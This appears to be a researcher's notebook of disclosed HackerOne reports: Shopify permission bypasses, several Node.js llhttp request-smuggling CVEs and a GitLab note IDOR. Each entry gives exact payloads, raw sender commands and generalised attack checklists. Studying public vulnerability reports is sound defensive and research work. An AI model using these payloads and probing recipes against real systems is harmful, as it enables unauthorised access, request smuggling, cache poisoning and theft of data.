SOURCE: https://hackerone.com/reports/1555502   2026-11-08
ROUTE: full body via the HackerOne `.json` endpoint (`curl -A "<desktop Chrome UA>" https://hackerone.com/reports/1555502.json` → HTTP 200, 22,872 B; `vulnerability_information` 6,483 B, carrying the GraphQL mutation, the `ACCESS_DENIED` response and the five reproduction steps). Metadata: Shopify, "Collaborators and Staff members without all necessary permissions are able to create, edit and install custom apps", weakness `Improper Access Control - Generic`, severity medium, bounty $1,900, reporter `kun_19`, created 2022-04-30, disclosed 2022-07-11. Read IN FULL this pass; nothing from memory; not reproduced.
STATUS: UNVERIFIED (not reproduced)
CLASS: broken access control / privilege escalation — a migration to GRANULAR object-scoped permissions leaves the COARSE requirement satisfiable by ANY single object grant: the UI keeps the old gate, the resolver does not, so a mutation the UI will not even render executes from a role that does not hold the documented permission (CWE-863 / CWE-863-adjacent permission-predicate confusion).
CORE METHOD (the report's own steps and request shapes):
  1. Establish the documented rule and BOTH gates. Shopify documents that changing what an admin-created custom app can access needs three permissions together (`View apps developed by staff and collaborators`, `Develop apps`, `Manage and install apps and channels`). With the third missing, the staff user cannot reach `<STORE>/admin/apps/development`, AND the raw call is refused — `POST /admin/internal/web/graphql/core?operation=CreateAppMutation&type=mutation HTTP/2`, headers `Host: <STORE>`, `Cookie: <STAFF_MEMBER_COOKIE>`, `X-Csrf-Token: <CSRF>`, `Origin: https://<STORE>`, `Content-Type: application/json`, `X-Shopify-Web-Force-Proxy: 1`, body `{"operationName":"CreateAppMutation","variables":{"input":{"title":"test","maintainerUserId":"gid://shopify/StaffMember/<ID>"}},"query":"mutation CreateAppMutation($input: ShopOwnedAppCreateInput!){shopOwnedAppCreate(input:$input){app{id title}userErrors{field message code}}}"}` → `HTTP/2 200` with `"data":{"shopOwnedAppCreate":null}` and `errors[0].extensions.code = "ACCESS_DENIED"`, `requiredAccess = "The user must have edit permissions for custom apps."`.
  2. Change exactly ONE thing: the store owner grants the staff member permission to a SINGLE specific app. The config section is STILL unreachable in the UI — but the SAME request now succeeds and the custom app is created; the owner then sees it in the app list. (Reporter: "but when using the API endpoints now directly, custom apps can be created, edited and installed by the staff member! The HTTP request above is now successful… This is definitely not intended.")
  3. Walk the sibling mutations on the same predicate: after creation the staff member can edit the app's Admin API access scopes and INSTALL the app ("The other API endpoints related to the custom apps can also be used").
  4. Impact in the reporter's own list: create + install new custom apps with chosen Admin API access scopes; edit/modify existing apps of the owner and other staff (changing API scopes = Integrity); uninstall an app (Availability); uninstall + reinstall, which ROTATES the access keys (Integrity + Availability).
DETECTION SIGNAL: a product that has moved to object-scoped grants (per-app / per-project / per-repository / per-channel / per-team) while the operation you are testing is still described by a COARSE requirement — the tell is a permission dialog offering an "on this one object" grant beside the global ones. The probe oracle is the SAME request run twice: with the coarse permissions only (→ `ACCESS_DENIED` + `requiredAccess`) and then with the coarse permissions PLUS one object grant (→ a domain result). The UI's refusal is not evidence of anything; the resolver's predicate is what decides.
CHAIN: low-privileged staff/collaborator account holding a grant on exactly ONE app (primitive: no privileged role, no global app permission) → the coarse resolver check on `shopOwnedAppCreate` is satisfied by the mere PRESENCE of an object-level app-edit grant (primitive: permission-predicate confusion — broken function-level authorization) → the staff member creates + installs a custom app and sets its Admin API access scopes (escalation: an app credential carrying scopes the human never held, plus write access over the store's app surface) → edits scopes of owner-authored apps, uninstalls them, or uninstall/reinstalls to rotate keys (impact: integrity + availability of the store's whole integration surface). Program rated it medium / $1,900 — the account is inside the trust boundary, which is what caps it; the METHOD is the P1-shaped part.
TRANSFERABLE TEST: for every mutation behind a COARSE permission name, enumerate the fine-grained grants the product offers and replay the coarse operation while holding exactly ONE of them. Concretely: (a) capture the mutation the privileged UI issues — internal admin GraphQL is a favourite (`/admin/internal/web/graphql/core?operation=<X>Mutation&type=mutation`) — and replay it verbatim from the low-privileged account; (b) read `extensions.code` / `requiredAccess` (the resolver's own words) rather than the HTTP status; (c) then apply one object-scoped permission and re-send the identical bytes. RULE: when a permission system migrates from global to per-object, the OLD gate survives wherever a resolver was not re-pointed — test the resolver, never the menu, and prefer the mutation the UI will not render.

SOURCE: https://hackerone.com/reports/1010835   2026-11-08
ROUTE: full body via the HackerOne `.json` endpoint → HTTP 200, 6,724 B; `vulnerability_information` 2,054 B (the replication request plus the extracted-cost response). Metadata: Shopify, "Low Privileged Staff Member Can Export Billing Charges", weakness `Improper Access Control - Generic`, severity medium, bounty $1,900, reporter `ash_nz`, created 2020-10-18, disclosed 2020-11-26. Read IN FULL this pass; NOT reproduced — and the reporter says so themselves ("I'm not 100% sure about this because i don't have billing transactions on my account"); the program nevertheless accepted it, which is the point of the oracle.
STATUS: UNVERIFIED (not reproduced)
CLASS: authorization-absence oracle — the SEMANTICS of the error a mutation returns proves whether the permission check exists at all: domain vocabulary ("Not found") means the resolver executed and reached the data layer; authorization vocabulary ("Access denied") means the gate held. A locator for missing function-level authorization (CWE-862) that needs no guessing and no id guessing.
CORE METHOD (reporter's reasoning, verbatim structure):
  1. Take a mutation whose UI action is reserved to a privileged role: `POST /admin/internal/web/graphql/core`, headers `Cookie: <LOW_PRIV_STAFF>`, `X-CSRF-Token: <CSRF>`, `Content-Type: application/json`, body `{"query":"mutation BillingChargesExport($id:ID!,$exportFormat:ExportFormat){billingChargesExport(id:$id,exportFormat:$exportFormat){message userErrors{field message}}}","variables":{"id":"gid://shopify/BillingInvoice/58138130","exportFormat":"EXCEL_CSV"}}`.
  2. Read the ERROR, not the status code: HTTP 200, and `"billingChargesExport":{"__typename":"BillingChargesExportPayload","message":null,"userErrors":[{"message":"Not found","field":null}]}` (plus a normal `extensions.cost` block, i.e. the field was resolved, not blocked).
  3. The interpretation is the technique — "I usually get `access denied` or something that indicates a privilege issue. However in this case i'm getting `Not found` which indicate that the resolver searched for the given `BillingInvoice` but could not find it."
  4. Keep the honesty boundary the reporter keeps: the oracle proves the caller was NOT rejected by a permission check (the code path ran past it); it does not by itself prove data was returned, because the reporter had no billing invoice to name. Pair the oracle with one VALID object before claiming the export — the value here is that the gate is provably absent, which is the hard half.
DETECTION SIGNAL: two error vocabularies from the same API answering the same caller — authorization errors that NAME a permission (`ACCESS_DENIED`, `requiredAccess: "The user must have edit permissions for X"`, "not authorized", "forbidden", "you do not have permission") versus DOMAIN errors produced after the data layer was reached (`Not found`, `null`, an empty payload object, "not a member of", a validation complaint about the ARGUMENTS). Collect one of each shape once per API, then diff every operation you are not entitled to run against the pair.
CHAIN: any authenticated non-privileged role (primitive: a staff seat with no billing permissions) → a billing/finance mutation answers with a DOMAIN error instead of an AUTHORIZATION error (primitive: function-level authorization missing on the resolver — `billingChargesExport`) → with a valid `BillingInvoice` id the same call exports the shop's billing charges (escalation: financial data exfiltration by a role explicitly denied it — the export file is the impact, not the error text) → the class generalises to every resolver whose permission check was never wired (impact: read of privileged financial/account data; rated medium / $1,900 upstream, and it is the fastest way to FIND the resolver that is missing its gate).
TRANSFERABLE TEST: for every operation the UI will not let you perform, send it ANYWAY and CLASSIFY THE ERROR FIRST: (a) authorization vocabulary ⇒ the gate exists, drop it; (b) domain vocabulary ⇒ the resolver ran, so repeat the identical operation as a role/tenant that legitimately holds the data (or with an id you know to be valid) and you have the read. Then reverse the probe on the WRITE path: a mutation whose error is about the OBJECT's state rather than about YOUR permission is a write you were never meant to have. RULE: "Not found" from a request that should have been refused is a finding that is only waiting for an id — the permission check you assume is there is frequently only a UI convention, and the error text tells you which.

SOURCE: https://hackerone.com/reports/1630668  +  https://hackerone.com/reports/1524555  +  https://nodejs.org/en/blog/vulnerability/september-2022-security-releases/   2026-11-08
ROUTE: assigned source 6 (#1630668) is a STUB — full body 207 B, "Original Report: https://hackerone.com/reports/1524555", no technique of its own; the ORIGINAL report #1524555 was fetched on the same `.json` route (HTTP 200, 7,706 B; `vulnerability_information` 2,095 B) and read in full. The obs-fold bypass of the fix was read on the Node.js VENDOR ADVISORY page (web_extract, full body, section "CVE-2022-32213 bypass via obs-fold mechanic"). The parser source was diffed first-hand this pass: `curl https://raw.githubusercontent.com/nodejs/llhttp/{v6.0.4,v6.0.10}/src/llhttp/http.ts` (31,485 B / 34,558 B) — the buggy back-edge is present verbatim in v6.0.4 and replaced in v6.0.10. Metadata: #1524555 Internet Bug Bounty (scope `https://github.com/nodejs/node`), "HTTP Request Smuggling Due to Flawed Parsing of Transfer-Encoding", weakness HTTP Request Smuggling, medium, reporter `zeyu2001`, created 2022-03-28, disclosed 2022-07-07, CVE-2022-32213; #1630668 is the re-submission (created 2022-07-08, disclosed 2022-07-22, same CVE, reporter `zeyu2001`).
STATUS: UNVERIFIED (not reproduced on a vulnerable build — see MEASURED NEGATIVE in the pass note; the mechanism was read at the parser source, bug and fix)
CLASS: HTTP request smuggling (CVE-2022-32213) — TE obfuscation by TOKEN RE-MATCH: the parser does not compare the header VALUE, it looks for the token `chunked` and RE-TRIES the match after every failed lookahead, so values no RFC-conformant parser accepts still set chunked framing; a strict front-end rejects the same value as an invalid transfer-coding and falls back to `Content-Length`.
CORE METHOD (the report's payload/output plus the parser states read this pass):
  1. The defect is a fall-back, not a value check. Reporter: "After matching `\"chunked\"`, the parser attempts to match the CRLF sequence, failing which it matches `chunked` again. As a result, the following forms a valid request for the parser, despite the `Transfer-Encoding` value, `chunkedchunked`, being invalid." At the source (llhttp v6.0.4) the post-match state is `header_value_te_chunked_last`, whose last branch is `.otherwise(n('header_value_te_chunked'))` — the loop back into the matcher.
  2. Send it: `GET / HTTP/1.1` / `Host: localhost` / `Transfer-Encoding: chunkedchunked` / blank line / `1` / `a` / `0` / blank line.
  3. Read the differential, not just the crash: Node's probe server answered `{"Headers":{"host":"localhost","transfer-encoding":"chunkedchunked"},"Length":1,"Body":"a"}` — the RAW value is handed to the application unchanged (so an app-side validator or a WAF string rule sees `chunkedchunked` and objects) while the FRAMING was chunked (the body was de-chunked to `a`). That split is exactly what a front-end/back-end pair needs to desync.
  4. The same loop reaches comma-separated lists: `header_value_te_chunked_last` peeks `,` and returns to the token scan, so `Transfer-Encoding: chunked, chunked` is accepted too — which is why the fix had to turn that path into an error (`forbidAfterChunkedInRequest`, added in v6.0.10, refusing a request where a token follows `chunked,`).
  5. BYPASS THE PATCH (vendor advisory, read this pass): 6.0.10 stopped the re-match, and the fix was then bypassed with OBS-FOLD — "If the Node.js HTTP module is used as a proxy, then it incorrectly parses the transfer-encoding header as indicative of chunked request, while folding the headers and hence forwarding `Transfer-Encoding: chunked abc` which is not a valid transfer-encoding header to the downstream server." Payload shape: `Transfer-Encoding: chunked` followed by a folded continuation line ` abc` (leading SP/TAB on the next line) → the folding side frames as chunked, the forwarded value is invalid to the other side.
DETECTION SIGNAL: any HTTP/1 parser in the chain whose TE handling SCANS instead of EQUALS — token lists, comma splitting, whitespace normalisation, lower-casing, obs-fold/LWS continuation support — reachable through a header value you control. Confirm with a three-request set on one connection: control `Transfer-Encoding: chunked` (accepted by both sides), then `Transfer-Encoding: chunkedchunked` and `Transfer-Encoding: chunked` + folded ` abc` (accepted by the lenient side only), each carrying a chunked body; the tell is framing (chunked de-chunking, `Length`, body content) that changes while the header value is one a strict parser refuses.
CHAIN: an attacker-writable TE header value on a request the edge forwards (primitive: any request to a front-end→back-end HTTP/1 hop; no credentials) → a value the strict parser rejects but the scanning parser still frames as chunked (primitive: TE obfuscation / parser differential) → the two ends disagree on where the request ends = TE.CL or CL.TE desync (escalation) → the smuggled prefix executes against the next request on the shared connection ⇒ access control bypass, cache poisoning, credentials stolen (the report's own impact wording) — P2, up to P1 where the poisoned resource is site-wide.
TRANSFERABLE TEST: against any front-end→back-end pair keep ONE valid chunked request as the control, then mutate ONLY the TE VALUE through the scanner-vs-equality list: `chunkedchunked`, `chunked, chunked`, `chunked` + folded ` abc`, `chunked\t`, a duplicate plain `Transfer-Encoding: chunked`, and `Transfer-Encoding: chunkedchunked` sent TWICE. Call it found when framing diverges from the control (body/`Length` computed from chunks while the value is invalid), or when the front-end's reject rule fires on a value the back-end still chunks. RULE: read the parser's TE state machine and attack the LOOKAHEAD it runs after a successful match — "match the token, then decide" is a re-match loop, and a re-match loop accepts any value that CONTAINS the token rather than the value that IS the token; when such a bug is patched with a strict equality rule, re-test through OBS-FOLD, because folding reintroduces a value the fold-er does not validate.

SOURCE: https://hackerone.com/reports/1888760  +  https://hackerone.com/reports/1675191  +  https://hackerone.com/reports/2032842  +  https://hackerone.com/reports/2001873   2026-11-08
ROUTE: assigned source 5 (#1888760) has `visibility: no-content` — the body was NEVER disclosed (0 activity entries); `web_extract` returned nothing, `https://r.jina.ai/https://hackerone.com/reports/1888760` returned only the SPA chrome (786 B) and the Wayback availability API reports `"archived_snapshots": {}` (no snapshot exists). The team's own triager summary on that report names the original submission, and the ORIGINAL #1675191 was fetched on the `.json` route (HTTP 200, 8,299 B; `vulnerability_information` 2,756 B) and read in full — that is the route that worked. Assigned source 4 (#2032842) rendered in full on `.json` (HTTP 200, 11,070 B; body 2,418 B) and its original #2001873 was fetched as well (5,645 B; body 2,342 B), agreeing with it. llhttp's delimiter states were read first-hand (v6.0.9, `header_value_discard_ws` / `…_almost_done` / `…_discard_lws`, and the strict-vs-lenient branch "Expected LF after CR"). Metadata: #1888760 / #1675191 Internet Bug Bounty, "HTTP Request Smuggling Due to Incorrect Parsing of Header Fields", HTTP Request Smuggling, medium, reporter `vvx7`, CVE-2022-35256, original created 2022-08-20, disclosed 2022-10-26; #2032842 / #2001873 Internet Bug Bounty, "HTTP Request Smuggling via Empty headers separated by CR", HTTP Request Smuggling, medium, reporter `yadhukrishnam`, CVE-2023-30589, original created 2023-05-25, disclosed 2023-06-20.
STATUS: UNVERIFIED (not reproduced on a vulnerable build — MEASURED NEGATIVE in the pass note; the mechanism is the reports' own text, corroborated against the parser source)
CLASS: HTTP request smuggling (CVE-2022-35256 / CVE-2023-30589) — HEADER-LINE DELIMITER leniency as the TE-obfuscation primitive: a line that is not properly CRLF-terminated lets the lenient parser (a) end an EMPTY-valued header there so the NEXT line — which a strict parser keeps inside that header's value — becomes a genuine header, and (b) treat a bare CR as the field delimiter while silently DROPPING the byte that follows it.
CORE METHOD (all shapes are the report bodies' own payloads):
  1. CVE-2022-35256 — EMPTY VALUE + improper termination is the obfuscation: "A header that precedes the `Transfer-Encoding`, contains an empty value, and is not properly delimited with CLRF may be used for TE obfuscation." Payload (a lone `\n`, no `\r`): `POST / HTTP/1.1` / `Host: localhost:5000` / `x:\nTransfer-Encoding: chunked` / blank / `1` / `A` / `0` / blank → ACCEPTED and processed as chunked.
  2. The report supplies its own CONTRAST, which is what makes this a signal rather than a guess: give that preceding header a VALUE and the identical improper break is REJECTED — "The request is rejected when the preceding header has a value but improper CLRF" (`x:x\nTransfer-Encoding: chunked`). The empty value is load-bearing.
  3. Folded variant from the same body's Note: three obs-folded TE lines — ` Transfer-Encoding: yeet\r\n Transfer-Encoding: \n Transfer-Encoding: chunked\r\n` — are accepted, and the application sees the folded, invalid value `{transfer-encoding: 'yeet, , chunked'}` while the framing is chunked.
  4. CVE-2023-30589 — bare CR as the delimiter, with the next byte consumed: `POST / HTTP/1.1` / `Host: localhost:5000` / `X-Abc:\rxTransfer-Encoding: chunked` / blank / `1` / `A` / `0` / blank → llhttp parses `{ host: 'localhost:5000', 'x-abc': '', 'transfer-encoding': 'chunked' }`, and the reporter's note is exact: "the next character to `\r` is missing in the parsed header name" — the `x` is eaten by the skip and `Transfer-Encoding: chunked` is a REAL header, while a front-end that does not treat a bare CR as terminating a header value sees ONE header `X-Abc:` whose value contains `\rxTransfer-Encoding: chunked`.
  5. Both bodies state the chain's first link in their own words: "A frontend proxy that does not consider `\r` as termination of an HTTP header value, could forward this to a backend, causing an HRS."
DETECTION SIGNAL: a header line terminated by anything other than CRLF (a lone LF, a bare CR, CR followed by a non-LF) plus an EMPTY value on the line immediately preceding the framing header; an engine whose scanner has a lenient / whitespace-discard / `lws` state (llhttp: `header_value_discard_ws` → `…_almost_done` → `…_discard_lws`, where STRICT mode raises "Expected LF after CR" and lenient mode SKIPS to the fold handler — the exact switch that yields (4)); obs-fold / continuation-line support anywhere in the chain. The test oracle is a differential: send the same request written with clean CRLF and then with the broken delimiter and compare framing.
CHAIN: a request the attacker writes with an improperly delimited header line (primitive: an empty-valued header ended by a lone LF, or a bare CR with the following byte dropped) → the back-end's parser promotes the embedded line to a real `Transfer-Encoding: chunked` while the front-end keeps it inside a header value (primitive: parser differential / TE obfuscation) → the two disagree on request length = HRS (escalation) → "HTTP Request Smuggling can lead to Access Control Bypass" (the report's own impact line; the same primitive reaches cache poisoning and credential theft) — P2, up to P1 where the poisoned resource is site-wide.
TRANSFERABLE TEST: on any HTTP/1 hop, take one clean chunked request as the control and then break ONLY the delimiter of the line ABOVE the framing header: (a) `x:` + LF (empty value); (b) `x: ` + LF; (c) `x:` + CR + ONE byte + the framing header — vary the dropped byte until the framing survives; (d) `x:CR LF` + SP/TAB + the framing header (obs-fold); (e) a fold whose trailing token only the fold-er tolerates (`chunked` + folded ` abc`; or `yeet` / empty / `chunked` folding to `yeet, , chunked`). Then send a victim request on the same connection and watch whose response it gets. RULE: the delimiter between header LINES is as attacker-controlled as the values — a parser with a lenient whitespace-discard state lets you hide a framing header inside another header's value, an EMPTY value on the line above is the cheapest way to make it accept the break, and a bare CR is worth one byte of sacrificial payload because the parser eats the byte after it. RELATED-BUT-DISTINCT from §17.236's recorded single-LF detector (methodologies-2026-11-08.md line ~1597: `\n\n` accepted as the end of the HEADER BLOCK, detected with `Expect: 100-continue`): that one probes block termination, this one hides a header INSIDE a value using an empty-valued line and a bare-CR delimiter, which no recorded entry covers.

SOURCE: https://hackerone.com/reports/1630669  →  original report https://hackerone.com/reports/1524692   2026-11-08
ROUTE: assigned source 1 (#1630669) is a STUB — full body 207 B, "Original Report: https://hackerone.com/reports/1524692", no technique of its own. Both were fetched on the `curl -A "<desktop Chrome UA>" https://hackerone.com/reports/<id>.json` route: #1630669 HTTP 200 / 8,761 B (body 207 B), #1524692 HTTP 200 / 6,460 B with `vulnerability_information` 2,816 B, read IN FULL this pass. Metadata: #1524692 Node.js team (assigned re-submission sits in Internet Bug Bounty), "HTTP Request Smuggling Due To Improper Delimiting of Header Fields", weakness HTTP Request Smuggling, medium, reporter `zeyu2001`, created 2022-03-28, disclosed 2022-07-07; CVE-2022-32214; llhttp in the `http` module of Node v17.8.0.
STATUS: UNVERIFIED (not reproduced as an exploit — see MEASURED NEGATIVE in the pass note: the exact payload is REJECTED by the Node on this host)
CLASS: HTTP request smuggling (CVE-2022-32214) — the FIELD DELIMITER is lenient: a lone LF (no CR) ends a header line whose value is NON-EMPTY, so the next line becomes a genuine header on the lenient side while a CRLF-strict peer keeps both lines inside ONE header value.
CORE METHOD (the report's own text and payload):
  1. The defect: "The LF character (without CR) is sufficient to delimit HTTP header fields in the `lihttp` parser. According to RFC7230 section 3, only the CRLF sequence should delimit each `header-field`."
  2. State the PAIR of upstream properties the chain needs, because they are the whole point: the proxy "Correctly delimits lines by the CRLF sequence instead of only LF" AND "Incorrectly allows the LF character in header values". With that pair, the proxy reads the smuggled line as part of a value (so its `Content-Length` for request 1 is 0) while Node reads it as a header.
  3. The payload (all lines CRLF except the marked `[\n]`):
     `GET / HTTP/1.1` / `Host: localhost` / `Dummy: x[\n]Content-Length: 23` / blank / `GET / HTTP/1.1` / `Dummy: GET /admin HTTP/1.1` / `Host: localhost` / blank
     — i.e. one `\n` (0x0A, no 0x0D) between a harmless header's value (`Dummy: x`) and the header you want the back-end to honour (`Content-Length: 23`).
  4. Raw sender: `(printf "GET / HTTP/1.1\r\n" "Host: localhost\r\n" "Dummy: x\nContent-Length: 23\r\n" "\r\n" "GET / HTTP/1.1\r\n" "Dummy: GET /admin HTTP/1.1\r\n" "Host: localhost\r\n" "\r\n" "\r\n") | nc localhost 80`. The bytes after the injected length are the attacker's OWN pipelined request, and its first line becomes the body of request 1 (23 bytes = `GET / HTTP/1.1\r\nDummy: `).
  5. Read the differential, not the status: "Expected result: Sees two requests, both to `/`. Actual result: Sees one request to `/` and another to `/admin`." Observed on Node: request 1 = `{"URL":"/","Headers":{"host":"localhost","dummy":"x","content-length":"23"},"Length":23,"Body":"GET / HTTP/1.1\r\nDummy: "}` and request 2 = `{"URL":"/admin","Headers":{"host":"localhost"},"Length":0,"Body":""}` — the second request reaches the application with a path the front-end never saw as a separate request.
  6. Because the injected header is `Content-Length` (not `Transfer-Encoding`), no framing header is obfuscated at all: the desync is manufactured by the DELIMITER ALONE, and the smuggled unit is a complete request with an attacker-chosen path.
DETECTION SIGNAL: an HTTP/1 hop whose parser accepts a bare LF as a field terminator while its peer requires CRLF; the fingerprinting probe is a request carrying `Dummy: x\nContent-Length: <n>` (bare LF) plus a pipelined second request — one side answers two requests, the other one. Same family tell: any WAF/proxy rule set that validates header VALUES by regex over the raw text (it sees one value `x\nContent-Length: 23`) sitting in front of an engine that splits on LF.
CHAIN: an attacker-written request with a lone-LF line break inside a header VALUE (primitive: no credentials, any client) → the lenient back-end promotes the next line to a real `Content-Length` header (primitive: parser differential — the front-end keeps it inside a value, so its view of request 1 is body-length 0) → the attacker's second request rides as the FIRST request's body and is processed as an independent request by the back-end (escalation) → the smuggled request reaches endpoints/paths the edge would never have authorised for the attacker's connection, and its response is delivered to the next user on the shared connection (impact: access-control bypass, cache poisoning, credential/response theft — the report's own impact wording: "cache poisoning, bypassing of security layers, stealing of credentials and so on") — P2, P1 where the poisoned resource is site-wide. RELATED-BUT-DISTINCT from the recorded leniency pair (CVE-2022-35256's EMPTY-valued header + lone LF *for TE obfuscation*, and §17.236's single-LF BLOCK-termination detector): here the header HAS a value, the injected header is `Content-Length`, and the smuggled bytes are the attacker's own pipelined request rather than a hijacked victim request.
TRANSFERABLE TEST: on any front-end→back-end HTTP/1 pair, send one clean control (proper CRLF, `Content-Length: 1`, body `A`) and confirm both ends agree, then replace ONE CRLF inside a header region with a bare LF: `Dummy: x` + `\n` + `Content-Length: <len-of-your-next-request>` + `\r\n` + blank + your second request. Declare it found when the back-end reports TWO requests (second one at your chosen path, reported body length 0) while the front-end reports ONE with body length 0 — and keep the empty-value variant (`x:\n`) and the bare-CR variant in the same probe set, since a parser may be lenient on one and strict on the other. RULE: a delimiter is as attacker-controlled as a value — never test header VALUES alone; test the byte BETWEEN lines, and prefer the variant that injects `Content-Length` (no framing header to obfuscate, and the smuggled unit is a whole request with your path in it).

SOURCE: https://hackerone.com/reports/1630667  →  original report https://hackerone.com/reports/1501679   2026-11-08
ROUTE: assigned source 2 (#1630667) is a STUB — full body 207 B, "Original Report: https://hackerone.com/reports/1501679". Both fetched on the `.json` route: #1630667 HTTP 200 / 8,796 B (body 207 B), #1501679 HTTP 200 / 13,544 B with `vulnerability_information` 3,670 B, read IN FULL this pass. Metadata: #1501679 Node.js team (assigned re-submission in Internet Bug Bounty), "HTTP Request Smuggling Due to Incorrect Parsing of Multi-line Transfer-Encoding", weakness HTTP Request Smuggling, medium, reporter `zeyu2001`, created 2022-03-06, disclosed 2022-07-07; CVE-2022-32215; llhttp in Node v17.6.0.
STATUS: UNVERIFIED (not reproduced as an exploit — MEASURED NEGATIVE in the pass note: rejected with 400 by the Node on this host)
CLASS: HTTP request smuggling (CVE-2022-32215) — CODING PRECEDENCE inside an obs-folded `Transfer-Encoding`: the parser stitches continuation lines with SP for the VALUE it exposes to the application, but decides the FRAMING from a coding it saw before/independently of that normalisation, so it frames as `chunked` while the value it hands the app — and any peer that reads the value correctly — ends in a non-chunked coding.
CORE METHOD (the report's own text and payloads):
  1. The payload is a `Transfer-Encoding` header with an obs-fold continuation line that adds a SECOND coding, and it is only valid because the parser accepts multi-line header values: `GET / HTTP/1.1` / `Transfer-Encoding: chunked` / ` , identity` / blank / `1` / `a` / `0` / blank (raw: `printf "GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n , identity\r\n\r\n1\r\na\r\n0\r\n\r\n"`).
  2. Observed: `{"Headers":{"transfer-encoding":"chunked , identity"},"Length":1,"Body":"a"}` — "it processes the final encoding as `chunked`" even though the folded value's final coding is `identity`. The application receives the UNNORMALISED, invalid value `chunked , identity`.
  3. The differential is the point: "An upstream proxy that correctly implements multi-line header values will therefore process the final encoding as `identity` instead. This could lead to request smuggling as an `identity` header indicates that the body length is 0 — the upstream proxy and Node will disagree on where a request ends."
  4. Why it survived the fix: the report names the lineage — "This could be seen as an incomplete fix to #1002188, though it is a slightly different issue. The fix for #1002188 processed subsequent `Transfer-Encoding` headers, only setting the `chunked` encoding if the last `Transfer-Encoding` header is `chunked`. This should be extended to check for subsequent LINES of the same `Transfer-Encoding` header." So the guard counts HEADERS, not the folded VALUE.
  5. The report's own variant shows the smuggled-request form (duplicate-TE replaced by a multi-line one): `POST / HTTP/1.1` / `Host: 127.0.0.1` / `Transfer-Encoding: chunked` / ` , chunked-false` / blank / `1` / `A` / `0` / blank / `GET /flag HTTP/1.1` / `Host: 127.0.0.1` / `foo: x` / blank.
  6. RFC context the report cites for why a strict peer is allowed to disagree: RFC7230 §3.2.4 requires an obs-fold to be replaced by SP "prior to interpreting the field value" — "While Node correctly replaces each received `obs-fold` with SP octets, in the case of the `Transfer-Encoding` header it does not do so prior to interpreting the field value."
DETECTION SIGNAL: any engine in the chain that accepts an obs-fold / continuation line (leading SP or TAB) INSIDE `Transfer-Encoding`, and whose value is exposed un-normalised (`chunked , identity`, `yeet, , chunked`, `chunked , chunked-false`); the probe oracle is a three-way set — plain `Transfer-Encoding: chunked` (both sides chunked), `Transfer-Encoding: chunked` + folded ` , identity` (lenient side chunked, strict side CL 0), and a duplicate/multi-line `chunked`, `chunked-false`. The tell is framing that follows one coding while the value's LAST coding disagrees.
CHAIN: an attacker-written `Transfer-Encoding` with a folded continuation coding (primitive: any request to a front-end→back-end HTTP/1 hop, no credentials) → the lenient back-end frames it as `chunked` while a correct reader of the same value derives `identity`/length 0 (primitive: obs-fold normalisation applied to the exposed value but not to the interpretation) → the two disagree on where request 1 ends = TE.CL / CL.TE desync (escalation) → the smuggled prefix executes against the next request on the shared connection ⇒ access-control bypass, cache poisoning, credential theft (the report's own impact wording) — P2, P1 where the poisoned resource is site-wide. RELATED-BUT-DISTINCT from the recorded obs-fold material (CVE-2022-32213's `Transfer-Encoding: chunked` + folded ` abc` patch bypass; #1675191's triple-folded `yeet` / empty / `chunked`): those rely on the fold making the token UNRECOGNISABLE or repeating it, whereas here the fold adds a NON-CHUNKED coding that the lenient side ignores and the strict side honours — the exploitable axis is WHICH CODING WINS, not whether the token is seen.
TRANSFERABLE TEST: keep one clean chunked request as the control, then attach a continuation coding to `Transfer-Encoding`: ` , identity`, ` , chunked-false`, ` , gzip` (leading SP, then a comma and a second token) and watch framing — if the body is de-chunked while the exposed value's last coding is not `chunked`, the hop is desynced; send a victim-shaped request on the same connection and see whose response comes back. RULE: when a parser normalises a folded value for the APPLICATION but interprets the value BEFORE normalising, the differential is "which coding wins" — test every coding you can put after the fold, not just a repeat of `chunked`; and when a fix guards "the last HEADER", re-test with the same token moved into a folded LINE of the same header.

SOURCE: https://hackerone.com/reports/1751258   2026-11-08
ROUTE: full body via `curl -A "<desktop Chrome UA>" https://hackerone.com/reports/1751258.json` → HTTP 200, 16,348 B, `vulnerability_information` 8,410 B, read IN FULL this pass. Metadata: GitLab, "Attacker is able to create,Edit & delete notes and leak the title of a victim's private personal snippet", weakness Insecure Direct Object Reference (IDOR), severity medium, reporter `cryptopone`, created 2022-10-25, disclosed 2023-06-02, tested against GitLab 15.5.1-ee (OmniAuth enabled), reproduced by the reporter on gitlab.com.
STATUS: UNVERIFIED (not reproduced — no GitLab instance of that line available this pass; the request shapes and the vulnerable finder branch are the reporter's, quoted below)
CLASS: IDOR / broken access control through a POLYMORPHIC TARGET PARAMETER — the note route takes a (type, id) pair, and the finder's branch for the type `personal_snippet` returns an UNSCOPED relation (`PersonalSnippet.all`) instead of a project-scoped one, so the create/edit/delete note operations skip the ownership check the sibling branches perform.
CORE METHOD (the report's own steps and requests):
  1. Establish the normal shape from a project you own: comment on an issue → the intercepted request is `POST /<attacker>/<privateproject>/notes?target_id=6&target_type=issue` with body `{"note":{"noteable_type":"Issue","noteable_id":6,"internal":false,"note":"@attacker was here"}}` (`target_id` = issue id, `target_type` = the type the UI uses).
  2. Change the TYPE and the ID: `target_type=personal_snippet` and `target_id=<VICTIM_SNIPPET_ID>` → `POST /<attacker>/<privateproject>/notes?target_id=<VICTIM_SNIPPET_ID>&target_type=personal_snippet HTTP/2` → "A new note will be created under the private snippet."
  3. The root cause in the reporter's own words, with the vulnerable branch: `app/finders/notes_finder.rb` → `def noteables_for_type(noteable_type)` … `when "issue" then IssuesFinder.new(@current_user, project_id: @project.id).execute`, `when "merge_request" then MergeRequestsFinder…execute`, `when "snippet", "project_snippet" then SnippetsFinder.new(@current_user, project: @project).execute`, and `when "personal_snippet" then PersonalSnippet.all` — "By changing the POST parameter noteable_type from `issue` to `personal_snippet` the server doesn't perform the project check when attempting to create the note".
  4. Walk the WRITE siblings with the same pair, using the note `id` returned when the note was created (also discoverable from the victim's own `#note_<id>` link): edit — `PUT /<attacker>/<privateproject>/notes/<id>` with body `{"target_type":"personal_snippet","target_id":<VICTIM_SNIPPET_ID>,"note":{"note":"test2"}}`; delete — `DELETE /<attacker>/<privateproject>/notes/<id>`. "Attacker must be the owner of the note" for edit/delete to apply.
  5. The READ-OUT is the technique's second half: the note you placed is rendered in YOUR OWN activity feed together with the PARENT OBJECT'S TITLE — "If the attacker visits their profile page and views activity, they will confirm if they reached the comment and can obtain the title of the private snippet." So a write-side authorization gap is converted into a read primitive by the attacker's own feed.
